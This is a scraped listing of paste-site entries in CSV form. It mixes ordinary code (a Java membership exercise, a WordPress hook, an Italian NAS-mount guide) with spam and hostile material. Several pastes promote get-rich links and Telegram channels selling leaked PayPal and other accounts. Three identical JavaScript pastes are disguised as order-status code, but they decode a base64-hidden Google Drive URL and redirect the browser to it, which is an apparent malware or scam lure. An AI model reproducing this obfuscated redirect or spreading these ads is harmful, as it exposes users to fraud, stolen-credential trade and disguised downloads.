id,title,username,language,date,content
BMFKPqUb,Make $1000 15-MINUTES (BEGINNER) L4,covertbelli,JavaScript,Tuesday 29th of April 2025 06:38:46 AM CDT," 
Pdf https://tinyurl.com/freshleaks

4nRq1ABaHr
"
DhnY7aLM,Untitled,jm33,JavaScript,Tuesday 29th of April 2025 06:37:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28842/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JUpHMGRc,PayPal with Balance,zebmekey,JavaScript,Tuesday 29th of April 2025 06:34:55 AM CDT,63764 Accounts Posted On https://t.me/leakzbyeminem
5WBx2RL4,[NP] Membership,dzocesrce,Java,Tuesday 29th of April 2025 06:34:53 AM CDT,"public class Membership {

    static List<User> users =new ArrayList<>();;
    static Map<String,Integer> userByNumberOfRegistrations= new HashMap<>();


    public static void createUser(String username, String password, String email, String country, Integer age) {
           Membership.users.add(new User(username,password,email,country,age));
           userByNumberOfRegistrations.putIfAbsent(email,0);
           userByNumberOfRegistrations.computeIfPresent(email,(k,v)->v=v+1);
    }

    public static Map<String,Integer> getNDifferentUsersByEmail() {
        return userByNumberOfRegistrations.entrySet().stream()
                .sorted(Comparator.comparing((Map.Entry<String,Integer> entry)->entry.getValue(),Comparator.reverseOrder()))
                .collect(Collectors.toMap(
                        entry->entry.getKey(),
                        entry->entry.getValue(),
                        (e1, e2) -> e1,
                        LinkedHashMap::new
                ));

    }

    public static List<User> getUsersOrderedByEmail() {
        return users.stream().sorted().collect(Collectors.toList());
    }

    public static boolean deleteUser(int userId) {
        User u = users.stream().filter(i->i.id == userId).findAny().orElse(null);
        if(u != null){
            users.remove(u);
            userByNumberOfRegistrations.computeIfPresent(u.getEmail(),(k,v)->v=Math.max(0,v-1));
            if(userByNumberOfRegistrations.get(u.getEmail())==0){
                userByNumberOfRegistrations.remove(u.getEmail());
            }
            return true;
        }
        return false;
    }
}

public class User implements Comparable<User>{
    String username;
    String password;
    String email;
    PersonalInformation personalInformation;
    int id;
    public static int ID_GENERATOR=0;

    public User(String username, String password, String email, String country, Integer age) {
        this.username= username;
        this.password = password;
        this.email = email;
        this.personalInformation = new PersonalInformation(country, age);
        ++ID_GENERATOR;
        this.id = ID_GENERATOR;
    }

    public String getUsername() {
        return username;
    }

    public String getPassword() {
        return password;
    }

    public String getEmail() {
        return email;
    }

    public PersonalInformation getPersonalInformation() {
        return personalInformation;
    }

    public int getId() {
        return id;
    }

    @Override
    public String toString() {
        return String.format(""%d: %s, %s"", id, username, email);
    }

    @Override
    public int compareTo(User o) {
        return Comparator.comparing(User::getEmail).compare(this,o);
    }
}

public class PersonalInformation {
    String country;
    int age;

    public PersonalInformation(String country, int age) {
        this.country = country;
        this.age = age;
    }

    public String getCountry() {
        return country;
    }

    public int getAge() {
        return age;
    }
}

public class MembershipTest {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int length = scanner.nextInt();
        scanner.nextLine();
        for(int i=0;i<length;i++){
            String username = scanner.nextLine();
            String password = scanner.nextLine();
            String email = scanner.nextLine();
            String country = scanner.nextLine();
            Integer age = scanner.nextInt();
            scanner.nextLine();
            Membership.createUser(username,password,email,country,age);
        }

        for(int i=0;i<length;i++){
            System.out.println(Membership.getNDifferentUsersByEmail());
            System.out.println(Membership.getUsersOrderedByEmail());
            System.out.println(Membership.deleteUser(i+1));
        }

        System.out.println(Membership.deleteUser(1));
    }
}"
VEjtvgEe,Untitled,geminilabs,PHP,Tuesday 29th of April 2025 06:30:44 AM CDT,"add_action('admin_init', function () {
    if (!function_exists('glsr_get_reviews')) {
        return;
    }
    if (!function_exists('glsr_update_review')) {
        return;
    }
    $reviews = glsr_get_reviews([
        'per_page' => -1,
    ]);
    foreach ($reviews as $review) {
        if (empty($review->author_id)) {
            error_log(""🟠 Skipped review ID {$review->ID}: No author found"");
            continue;
        }
        if (!empty($review->assigned_users)) {
            error_log(""🟠 Skipped review ID {$review->ID}: Already has assigned user"");
            continue;
        }
        $result = glsr_update_review($review->ID, [
            'assigned_users' => $review->author_id,
        ]);
        if (false === $result) {
            error_log(""🔴 Skipped review ID {$review->ID}: Update failed"");
            continue;
        }
        error_log(""🟢 Assigned {$review->author_id} to review ID {$review->ID}"");
    }
    error_log(""✅ Finished assigning users to reviews"");
});"
mMWcU4Ln,EARN $900 INSTANTLY 2025⭐ GV,covertbelli,JavaScript,Tuesday 29th of April 2025 06:29:31 AM CDT," 
Pdf https://tinyurl.com/freshleaks

gSvDlIyo3A
"
3Vfxqdhz,Montare NAS su ubuntu,Loque,Bash,Tuesday 29th of April 2025 06:27:12 AM CDT,"Montare NAS su ubuntu (passaggi)
l'ip del nas lo trovi su ubuntu aprendo l'esplora risorse e andando su rete. nella lista trovi openmediavault con l'ip visibile
su ubuntu lancia comando apt install cifs-utils
su openmediavault come prima cosa sblocca dalla cifratura di luks
il raid dovrebbe ora essere online (verde)
monta su ubuntu il nas:
mount -t cifs //172.16.17.210/NAS /mnt/nas -o username=loris,password=inserireQui,vers=3.0

Dove:

    //172.16.17.210/NAS è l'indirizzo della condivisione SMB sul tuo NAS.

    /mnt/nas è la directory locale dove montare la condivisione.

    username e password sono le credenziali di accesso alla condivisione.

    vers=3.0 specifica la versione del protocollo SMB.
    
Se non vuoi digitare ogni volta la stessa stringa manualmente, puoi creare uno script che esegue il montaggio automaticamente:

    Crea uno script di montaggio:

nano ~/mount_nas.sh

Inserisci il comando di montaggio nel file:

sudo mount -t cifs //172.16.17.210/NAS /mnt/nas -o username=loris,password=inserireQui,vers=3.0

Salva il file e chiudilo.

Rendi eseguibile lo script:

chmod +x ~/mount_nas.sh

Ora puoi eseguire lo script per montare la condivisione ogni volta che vuoi:

~/mount_nas.sh    "
Nvk23Xj0,Untitled,zebmekey,JavaScript,Tuesday 29th of April 2025 06:21:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24732/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jYdRLFHx,Make $1000 15-MINUTES  (BEGINNER) YR,covertbelli,JavaScript,Tuesday 29th of April 2025 06:20:17 AM CDT," 
Pdf https://tinyurl.com/freshleaks

rsCYvcYTRP
"
jHsAMjTv,PayPal with Balance,SpawnKz,JavaScript,Tuesday 29th of April 2025 06:19:28 AM CDT,55913 Accounts Posted On https://t.me/leakzbyeminem
sSHwETBp,EARN $900 INSTANTLY 2025 95,covertbelli,JavaScript,Tuesday 29th of April 2025 06:10:55 AM CDT," 
Pdf https://tinyurl.com/freshleaks

s3nW8nr8zq
"
7pnFMKeY,Products.js,zebmekey,JavaScript,Tuesday 29th of April 2025 06:05:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14485/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xnVPCTfr,Leaked Accounts - Fresh Hits,SpawnKz,JavaScript,Tuesday 29th of April 2025 06:04:04 AM CDT,61619 Accounts Posted On https://t.me/leakzbyeminem
